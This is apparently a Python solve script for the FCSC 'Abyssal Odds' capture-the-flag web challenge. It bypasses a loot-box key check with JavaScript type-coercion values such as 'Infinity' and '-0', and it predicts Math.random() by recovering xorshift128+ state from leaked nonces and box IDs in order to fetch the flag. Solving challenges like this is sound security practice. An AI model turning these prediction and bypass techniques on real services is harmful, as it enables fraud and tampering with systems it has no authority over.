from requests import Session
from datetime import datetime
import re
import xs128p
import math
import sys

if 'REMOTE' in sys.argv:
    base_url = 'https://abyssal-odds.france-cybersecurity-challenge.fr'
else:
    base_url = 'http://localhost:8000'    

buy_url = base_url + '/buy'
open_url = base_url + '/open'
collection_url = base_url + '/collection'


def init(session:Session):
    response = session.get(url=buy_url)
    #print(session.cookies)
    return session.cookies['csrf_token']

def print_collection(session:Session):
    response = session.get(url=collection_url)
    #print(response.text)
    pattern_collection = r'alt="([a-zA-Z ]+)" class="rounded-t-lg " />'
    collection = re.findall(pattern_collection, response.text)

    print(f'=======================================')
    print(f'= collection = {len(collection)} element(s)')
    for element in collection:
        print(f'- {element}')
    flag_pattern = r'(FCSC{.+})'
    flag = re.findall(flag_pattern, response.text)
    print(f'{flag=}')


#====================================
# Hack Javascript !!!
#====================================
def open_box(session:Session, csrf_token:str, box_id:str, key:str, expected_box_name:str):
    response = session.post(url=open_url, data={'csrf_token': csrf_token, 'key': key, 'boxId': box_id, 'action': 'open'})
    #print(response.text)
    pattern_box_name = r'<div class="name text-2xl font-thin text-amber-600">([a-zA-Z ]+)</div>'
    box_name = re.findall(pattern_box_name, response.text)[0]
    print(f'{box_name=}')
    if box_name == expected_box_name:
        print(f'{expected_box_name} ... OK')
    else:
        print(f'{expected_box_name} ... KO, obtain : {box_name}')
        quit()


def solve_case(session:Session, csrf_token:str, case:str, key:str, expected_box_name:str):
    print(f'=======================================')
    print(f'= cas {case}')

    # Buy the box
    response = session.post(url=buy_url, data={'csrf_token': csrf_token, 'action': 'buy'})
    #print(response.text)
    pattern_box_id = r'<input type="hidden" name="boxId" value="([0-9a-f]{16})" />'
    box_id = re.findall(pattern_box_id, response.text)[0]
    print(f'{box_id=}')

    # Open it
    open_box(session, csrf_token, box_id, key, expected_box_name)

# case Math.abs(key - ts) < 60:
#        return 2;
def solve_case_2(session:Session, csrf_token:str):
    ts = round(datetime.now().timestamp())
    solve_case(session, csrf_token, '2', ts, 'Luminescent Medusa')

# case box.seed % key === 0:
#      return 3;
def solve_case_3(session:Session, csrf_token:str):
    solve_case(session, csrf_token, '3', '1', 'Sovereign Cephalopod')

# case Math.cos(key) * 0 !== 0:
#      return 4;
def solve_case_4(session:Session, csrf_token:str):
    solve_case(session, csrf_token, '4', 'Infinity', 'Coral Reef Specter')

# case key && (box.seed * key) % 1337 === 0:
#      return 5;
def solve_case_5(session:Session, csrf_token:str):
    solve_case(session, csrf_token, '5', '1337', 'Celestial Seastar')

# case key && (box.seed | key) === (box.seed | 0):
#      return 6;
def solve_case_6(session:Session, csrf_token:str):
    solve_case(session, csrf_token, '6', f'{0xffffffff+1}', 'Majestic Chelonian')

# case !(key < 0) && box.seed / key < 0:
#       return 7;
def solve_case_7(session:Session, csrf_token:str):
    solve_case(session, csrf_token, '7', '-0', 'Treasure Trove')

# default:
#      return 0;
def solve_case_default(session:Session, csrf_token:str):
    solve_case(session, csrf_token, 'default', '111111', 'Ocean Pearl Bivalve')

#==========================================


#==========================================
# Attack Math.random()
#==========================================
def convert_randomhex_as_2_random(nonce:str):
    random_1, random_2 = nonce[:8], nonce[8:]
    random_1, random_2 = [int(r, 16) for r in [random_1, random_2]]
    print(f'{nonce=} -> {random_1}, {random_2}')
    return random_1, random_2

def extract_random_nonce_from_page(html:str):
    pattern_nonce = r'<script nonce="([0-9a-f]{16})" src="https://cdn.tailwindcss.com"></script>'
    nonce = re.findall(pattern_nonce, html)[0]
    return convert_randomhex_as_2_random(nonce)

def extract_last_2_random(session:Session):
    response = session.get(url=buy_url)
    return extract_random_nonce_from_page(response.text)

# case key === box.seed:
#      return 1;
def solve_case_1(session:Session, csrf_token:str):
    # Init sequence of random
    random_sequence = []
    for _ in range(6):
        random_sequence += extract_last_2_random(session)
    print(random_sequence)

    # Buy Box 
    response = session.post(url=buy_url, data={'csrf_token': csrf_token, 'action': 'buy'})
    pattern_box_id = r'<input type="hidden" name="boxId" value="([0-9a-f]{16})" />'
    box_id = re.findall(pattern_box_id, response.text)[0]
    print(f'{box_id=}')

    # and get last 4 random
    random_sequence += extract_random_nonce_from_page(response.text)
    random_sequence += convert_randomhex_as_2_random(box_id)
    print(random_sequence)

    # calculate next random value
    random_prediction_count, multiple = 1, 0xffffffff
    state0, state1 = xs128p.solve(random_sequence[::-1], multiple, random_prediction_count)
    
    state0, state1, output = xs128p.xs128p(state0, state1)
    prediction = math.floor(multiple * xs128p.to_double(output))
    print(f'{prediction=}')

    # Open that Box
    open_box(session, csrf_token, box_id, f'{prediction}', 'Royal Crustacean')

#==========================================




session = Session()
# Add FCSC certification chain
session.verify = './all.crt'

csrf_token = init(session)
print(f'{csrf_token=}')
solve_case_6(session, csrf_token)
solve_case_2(session, csrf_token)
solve_case_3(session, csrf_token)
solve_case_4(session, csrf_token)
solve_case_5(session, csrf_token)
solve_case_7(session, csrf_token)
solve_case_default(session, csrf_token)
solve_case_1(session, csrf_token)
print_collection(session)
session.close()
